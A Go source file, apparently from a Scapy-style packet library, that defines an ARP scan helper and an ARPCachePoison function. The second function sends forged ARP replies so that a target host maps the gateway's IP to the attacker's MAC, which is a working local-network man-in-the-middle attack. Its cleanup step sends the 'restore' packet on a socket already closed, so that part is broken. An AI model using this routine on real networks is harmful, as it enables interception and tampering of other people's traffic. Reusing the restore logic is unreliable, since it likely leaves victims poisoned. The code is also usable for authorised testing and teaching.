package higherlevel

import (
	"github.com/google/gopacket/layers"
	"github.com/tiagomdiogo/GoPpy/packet"
	"github.com/tiagomdiogo/GoPpy/supersocket"
	"github.com/tiagomdiogo/GoPpy/utils"
	"net"
	"time"
)

func ARPScan(iface string, targetIP string) (string, error) {
	// Get MAC address of interface
	srcMAC, err := utils.MacByInt(iface)
	if err != nil {
		return "", err
	}

	// Get IP address of interface
	srcIP, err := utils.ParseIPGen(iface)
	if err != nil {
		return "", err
	}

	// Create a new SuperSocket
	ss, err := supersocket.NewSuperSocket(iface, "")
	if err != nil {
		return "", err
	}

	// Craft ARP Request Layer
	arpRequest := packet.ARPLayer()
	arpRequest.SetSrcMac(srcMAC)
	arpRequest.SetSrcIP(srcIP)
	arpRequest.SetDstIP(targetIP)
	arpRequest.SetRequest()
	arpRequest.SetDstMac("ff:ff:ff:ff:ff:ff")

	arpRequestPacket, err := packet.CraftPacket(arpRequest.Layer())
	if err != nil {
		return "", err
	}

	// Send ARP request
	err = ss.Send(arpRequestPacket)
	if err != nil {
		return "", err
	}

	// Read packets
	for {
		pkt, err := ss.Recv()
		if err != nil {
			return "", err
		}

		// Parse the packet
		arpLayer := utils.GetARPLayer(pkt)

		if arpLayer != nil && arpLayer.Operation == layers.ARPReply && net.IP(arpLayer.SourceProtAddress).String() == targetIP {
			ss.Close()
			return net.HardwareAddr(arpLayer.SourceHwAddress).String(), nil
		}
	}
}

func ARPCachePoison(iface string, targetIP string, gatewayIP string) error {
	// Get MAC address of interface
	srcMAC, err := utils.MacByInt(iface)
	if err != nil {
		return err
	}

	// Get the MAC address of the target
	targetMAC, err := ARPScan(iface, targetIP)
	if err != nil {
		return err
	}

	// Create a new SuperSocket
	ss, err := supersocket.NewSuperSocket(iface, "")
	if err != nil {
		return err
	}

	// Craft Arp Layer
	arpLayer := packet.ARPLayer()
	arpLayer.SetSrcMac(srcMAC)
	arpLayer.SetDstMac(targetMAC)
	arpLayer.SetSrcIP(gatewayIP)
	arpLayer.SetDstIP(targetIP)
	arpLayer.SetReply()

	// Craft ARP reply packet to poison target's ARP cache
	arpReply, err := packet.CraftPacket(arpLayer.Layer())
	if err != nil {
		return err
	}

	// Send the ARP Reply in loop for some time (e.g. 10 seconds). This duration depends on the duration of your attack.
	for i := 0; i < 10; i++ {
		err = ss.Send(arpReply)
		if err != nil {
			return err
		}
		time.Sleep(1 * time.Second)
	}
	ss.Close()

	// Craft ARP reply packet with the legitimate MAC of the gateway to restore the original ARP entry
	gatewayMAC, err := ARPScan(iface, gatewayIP)
	if err != nil {
		return err
	}

	arpLayer.SetSrcIP(gatewayIP)
	arpLayer.SetSrcMac(gatewayMAC)

	arpReplyLegit, err := packet.CraftPacket(arpLayer.Layer())
	if err != nil {
		return err
	}

	// Send the legitimate ARP reply to the target
	err = ss.Send(arpReplyLegit)
	if err != nil {
		return err
	}

	return nil
}
